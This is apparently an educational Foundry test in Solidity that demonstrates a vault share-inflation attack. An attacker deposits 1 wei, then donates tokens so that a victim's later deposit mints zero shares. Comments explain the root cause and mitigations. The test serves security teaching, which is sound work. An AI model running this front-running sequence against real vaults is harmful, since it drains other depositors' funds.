// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// Example
// User 0 front runs user 1's deposit.

// User 0 deposits 1.
// User 0 donates 100 * 1e18. This inflates the value of each share.
// User 1 deposits 100 * 1e18. This mints 0 shares to user 1.
// User 0 withdraws all 200 * 1e18 + 1.

// Key Observations
// Inflation:

// The donation of tokens inflates the value of shares.
// When users[1] deposits after the donation, they receive fewer shares than they should for the amount they deposited.
// Attack Exploit:

// The attacker manipulates the vault's state by donating tokens, inflating the share value, and then profiting from the inflated share value at the expense of subsequent depositors.

// If you're looking for a reliable and audited implementation for a vault, consider using OpenZeppelin's ERC4626 contracts, which are part of their library and mitigate common vulnerabilities like the one highlighted here.

// Key Takeaway:
// The root of the problem is the vault's share-minting logic, which does not protect against external token transfers (force-feeding). To fix this, the vault should:

// Use internal accounting (track its own token balance, not rely on ERC20.balanceOf).
// Consider min-share thresholds to ensure deposits always result in at least 1 share being minted.

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, Vault, Token} from "../../../src/hacks/vault-inflation/VaultInflation.sol";

uint8 constant DECIMALS = 18;

contract VaultTest is Test {
    Vault private vault;
    Token private token;

    address[] private users = [address(11), address(12)];

    function setUp() public {
        token = new Token();
        vault = new Vault(address(token));

        for (uint256 i = 0; i < users.length; i++) {
            token.mint(users[i], 10000 * (10 ** DECIMALS));
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
    }

    function print() private {
        console2.log("vault total supply", vault.totalSupply());
        console2.log("vault balance", token.balanceOf(address(vault)));
        uint256 shares0 = vault.balanceOf(users[0]);
        uint256 shares1 = vault.balanceOf(users[1]);
        console2.log("users[0] shares", shares0);
        console2.log("users[1] shares", shares1);
        console2.log("users[0] redeemable", vault.previewRedeem(shares0));
        console2.log("users[1] redeemable", vault.previewRedeem(shares1));
    }

    function test() public {
        // users[0] deposit 1
        console2.log("--- users[0] deposit ---");
        vm.prank(users[0]);
        vault.deposit(1);
        print();

        // users[0] donate 100
        console2.log("--- users[0] donate ---");
        vm.prank(users[0]);
        token.transfer(address(vault), 100 * (10 ** DECIMALS));
        print();

        // users[1] deposit 100
        console2.log("--- users[1] deposit ---");
        vm.prank(users[1]);
        vault.deposit(100 * (10 ** DECIMALS));
        print();
    }
}
